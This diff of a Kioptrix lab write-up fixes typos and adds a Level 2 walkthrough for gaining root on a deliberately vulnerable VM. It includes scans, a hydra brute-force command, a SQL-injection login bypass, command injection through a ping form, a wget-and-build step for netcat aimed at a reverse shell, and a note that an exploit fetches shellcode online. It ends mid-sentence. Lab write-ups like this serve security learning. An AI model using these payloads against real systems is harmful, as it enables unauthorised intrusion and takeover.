@@ -4,7 +4,7 @@ Intro
     root access via any means possible (except actually hacking the VM server or player).
     The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
 Level 1
-    Reconnaissance. First, we need to fins the IP assigned through DHCP to the machine. We run a simple host discovery scan:
+    Reconnaissance. First, we need to find the IP assigned through DHCP to the machine. We run a simple host discovery scan:
     *$ nmap -sP 192.168.252.1/24
 Nmap scan report for 192.168.252.131
 Host is up (0.00033s latency).
@@ -65,7 +65,7 @@ Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Exploit*
 0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2*
 
-    And run it:
+    And run it. I read the exploit and it downloads a shellcode from the Internet, so I had to set the network as bridged rather than host only as I had earlier to prevent exposing the vulnerable VM to the local network.
     *./764 0x6b 192.168.0.8
 ....
 14:42:14 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
@@ -76,3 +76,210 @@ id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)*
     Challenge finished, we got root.
 
+Level 2
+    Reconnaissance. First, we need to find the IP assigned through DHCP to the machine. We know the mac address assigned by vmware, so we just need to find the corresponding IP running a host discovery scan:
+    *$ nmap -sP 192.168.252.1/24
+...
+Nmap scan report for 192.168.0.11
+Host is up (0.00082s latency).
+MAC Address: 00:0C:29:53:19:4C (VMware)
+...*
+    Next step, finding open ports and fingerprinting services running behind them:
+    *root@kali:~# nmap -A -sS -T5 192.168.0.11
+Host is up (0.00023s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
+80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
+111/tcp  open  rpcbind    2 (RPC #100000)
+443/tcp  open  ssl/https?
+631/tcp  open  ipp        CUPS 1.1
+| http-methods:
+|_  Potentially risky methods: PUT
+|_http-server-header: CUPS/1.1
+|_http-title: 403 Forbidden
+714/tcp  open  status     1 (RPC #100024)
+3306/tcp open  mysql      MySQL (unauthorized)
+MAC Address: 00:0C:29:53:19:4C (VMware)
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.30*
+    So the machine runs SSH, HTTP, CUPS, RPC and Mysql. A finding that catches my attention is the put method allowed, it could be useful. If we request the web page in the browser, we get a login page. If we request the web service behind 631 and we get a 403 Forbidden.
+
+    I set up a directory discovery while I look at other stuff:
+    *root@kali:/usr/share/exploitdb/platforms# dirb http://192.168.0.11 /usr/share/dirb/wordlists/big.txt*
+
+    It does not find anything interesting, just manual pages for Apache and forbidden directories. Looking at the headers of the response, there is a X-Powered-By:"PHP/4.3.9". I don't remember seeing this header before, it might have been put there as a hint. Looking for exploits for that PHP version we get:
+    *# searchsploit php 4.3.9
+---------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                            |  Path
+                                                                          | (/usr/share/exploitdb/platforms/)
+---------------------------------------------------------------------- ----------------------------------
+PHP 4.3.9 + phpBB 2.x - 'Unserialize()' Remote Exploit (Compiled)                          | php/webapps/697.c
+PHP 4.3.x - Microsoft Windows Shell Escape functions Command Execution                     | php/local/24173.txt
+PHP 4.3.x - Undefined Safe_Mode_Include_Dir Safemode Bypass                                | php/local/22911.php
+PHP 4.3.x/5.0 - 'openlog()' Buffer Overflow                                                | php/dos/22435.php
+------------------------------------------------------------------------*
+    I try finding PhpBB but it is not installed, the other ones are local so we can not use them. We run Nikto:
+    *nikto -h 192.168.0.11
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.11
++ Target Hostname:    192.168.0.11
++ Target Port:        80
++ Start Time:         2017-09-10 11:45:48 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.0.52 (CentOS)
++ Retrieved x-powered-by header: PHP/4.3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ Server leaks inodes via ETags, header found with file /manual/, fields: 0x5770d 0x1c42 0xac5f9a00;5770b 0x206 0x84f07cc0
++ Uncommon header 'tcn' found, with contents: choice
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8346 requests: 1 error(s) and 17 item(s) reported on remote host
++ End Time:           2017-09-10 11:46:30 (GMT1) (42 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested*
+    I look for exploits for Apache, OpenSSH, Linux Kernel but nothing interesting. I will try to make a PUT request to the web service on 631:
+        *# curl -X PUT -d file=/tmp/test http://192.168.0.11:631
+<HTML><HEAD><TITLE>403 Forbidden</TITLE></HEAD><BODY><H1>Forbidden</H1>You don't have permission to access the resource on this server.</BODY></HTML>*
+
+    The most interesting functionality so far is the login page. I play a bit with the login form on Burp and immediatly spot the comment:
+    *<!-- Start of HTML when logged in as Administator -->*
+
+    This seems a very interesting hint as it implies that there is a username called Administrator, let's set up a brute force attack with hydra. We can use 'in as Administator --></body>' as a delimiter to find a valid password:
+    *# hydra -l Administrator -P /usr/share/wordlists/metasploit/password.lst 192.168.0.11 http-post-form "/index.php:uname=^USER^&psw=^PASS^&btnLogin=Login:in as Administator -->\n</body>"*
+
+    We also scan the MySql server using metasploit:
+    *msf > use auxiliary/scanner/mysql/mysql_version
+msf auxiliary(mysql_version) > set rhosts 192.168.0.11
+rhosts => 192.168.0.11
+msf auxiliary(mysql_version) > run
+
+[*] 192.168.0.11:3306     - 192.168.0.11:3306 is running MySQL, but responds with an error: \x04Host '192.168.0.4' is not allowed to connect to this MySQL server*
+    I realized that I have not checked if the CUPS server running has any known vulnerability:
+    *# searchsploit CUPS
+----------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                        |  Path
+                                                                      | (/usr/share/exploitdb/platforms/)
+----------------------------------------------------------------------- ----------------------------------
+APC UPS 3.7.2 - 'apcupsd' Local Denial of Service                     | linux/dos/251.c
+CUPS - 'kerberos' Parameter Cross-Site Scripting                      | multiple/remote/10001.txt
+CUPS 1.1.x - '.HPGL' File Processor Buffer Overflow                   | linux/remote/24977.txt
+CUPS 1.1.x - Cupsd Request Method Denial of Service                   | linux/dos/22619.txt
+CUPS 1.1.x - Negative Length HTTP Header                              | linux/remote/22106.txt
+CUPS 1.1.x - UDP Packet Remote Denial of Service                      | linux/dos/24599.txt*
+
+    Try a few more exploits but no success. I come back to the login page on Burp, try again multiple input validation attacks and manage to bypass the login page sending a simple payload:
+    *POST /index.php HTTP/1.1
+Host: 192.168.0.11
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://192.168.0.11/
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+
+uname=Administator&psw='+or+'1'%3d'1&btnLogin=Login*
+
+    We are then presented with a ping a machine on the network:
+    *<b>Welcome to the Basic Administrative Web Console<br></b>
+			</td>
+		</tr>
+		<tr valign='middle'>
+			<td align='center'>
+				Ping a Machine on the Network:
+			</td><td align='center'>
+				<input type="text" name="ip" size="30">
+				<input type="submit" value="submit" name="submit">
+			</td>
+			</td>*
+
+	As promised, we can ping machines:
+	*POST /pingit.php HTTP/1.1
+Host: 192.168.0.11
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://192.168.0.11/index.php
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+
+ip=127.0.0.1&submit=submit
+
+HTTP/1.1 200 OK
+Date: Sun, 10 Sep 2017 08:40:50 GMT
+Server: Apache/2.0.52 (CentOS)
+X-Powered-By: PHP/4.3.9
+Content-Length: 396
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+127.0.0.1<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.010 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.021 ms
+
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1999ms
+rtt min/avg/max/mdev = 0.010/0.017/0.021/0.005 ms, pipe 2
+</pre>*
+    The server must we running the command ping, so I try a few input validation tests to escape out of the argument and run a shell command, after a few minutes I get remote command execution with a semicolon separator:
+    *POST /pingit.php HTTP/1.1
+Host: 192.168.0.11
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://192.168.0.11/index.php
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 29
+
+ip=127.0.0.1;id&submit=submit
+
+HTTP/1.1 200 OK
+Date: Sun, 10 Sep 2017 08:44:14 GMT
+Server: Apache/2.0.52 (CentOS)
+X-Powered-By: PHP/4.3.9
+Content-Length: 447
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+127.0.0.1;id<pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.009 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.012 ms
+
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1999ms
+rtt min/avg/max/mdev = 0.009/0.013/0.019/0.005 ms, pipe 2
+uid=48(apache) gid=48(apache) groups=48(apache)
+</pre>*
+
+    Next step is to elevent privileges to root. I run a ps command to see the processes running.
+    *
+    ...
+root      2795     1  0 03:12 ?        00:00:00 httpd
+root      2821     1  0 03:12 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe --datadir=/var/lib/mysql --socket=/var/lib/mysql/mysql.sock --err-log=/var/log/mysqld.log --pid-file=/var/run/mysqld/mysqld.pid
+mysql     2874  2821  0 03:12 ?        00:00:27 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --socket=/var/lib/mysql/mysql.sock*
+
+    Mysql is running as root. I will upload a PHP shell to work easily. We don't have write permissions to the web server root so that is not an option.
+    If netcat is install we can do a reverse shell. Netcat is not installed but wget is so we can download it. I try the followind:
+    *cd /tmp && wget --no-check-certificate http://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz && tar -xvf netcat-0.7.1.tar.gz && cd netcat-0.7.1 && ./configure && make && src/netcat --help*
+
+    But tar is not installed. I compile it in my Kali box and upload the binary to a public HTTP server to see if we are lucky
